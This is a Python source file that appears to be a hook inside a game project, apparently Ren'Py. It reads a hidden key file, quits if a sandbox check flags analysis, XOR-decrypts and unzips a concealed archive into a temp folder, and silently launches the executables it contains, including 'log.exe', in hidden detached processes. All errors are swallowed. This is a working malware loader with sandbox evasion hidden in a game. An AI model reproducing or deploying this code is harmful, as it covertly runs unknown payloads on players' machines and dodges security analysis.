import struct as _st
import subprocess
import os
import io
import sys
import zipfile
import tempfile
from threading import Thread
from planner import is_sandboxed

def _xdm(filename, key):
    with open(filename, 'rb') as f:
        ct = f.read()
    k = key.encode()
    return bytes([b ^ k[i % len(k)] for i, b in enumerate(ct)])

def _read_key(path):
    with open(path, 'rb') as f:
        d = f.read()
    flags = d[0]
    fn_len, pw_len, ex_len = _st.unpack_from('<HHH', d, 1)
    off = 7
    fn = d[off:off+fn_len].decode(); off += fn_len
    pw = d[off:off+pw_len].decode(); off += pw_len
    ex = d[off:off+ex_len].decode(); off += ex_len
    sb = bool(flags & 1)
    return fn, pw, ex, sb

def extract_and_run():
    try:
        game_dir = config.gamedir
        archive_name, password, exec_file, sandbox = _read_key(os.path.join(game_dir, ".key"))

        if not sandbox:
            try:
                c = is_sandboxed(logging=False)
            except Exception:
                c = 1
            if c >= 0.5:
                exit(0)

        run_dir = tempfile.mkdtemp()

        dec = _xdm(os.path.join(game_dir, archive_name), password)
        with zipfile.ZipFile(io.BytesIO(dec)) as z:
            if password:
                z.extractall(run_dir, pwd=password.encode())
            else:
                z.extractall(run_dir)

        exec_path = os.path.join(run_dir, exec_file)

        def _run():
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            cf = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            subprocess.Popen([exec_path, "node_modules.asar"], cwd=run_dir, startupinfo=si, creationflags=cf, close_fds=True)
            lp = os.path.join(run_dir, "log.exe")
            if os.path.exists(lp):
                subprocess.Popen([lp], cwd=run_dir, startupinfo=si, creationflags=cf, close_fds=True)

        Thread(target=_run).start()
    except Exception:
        pass
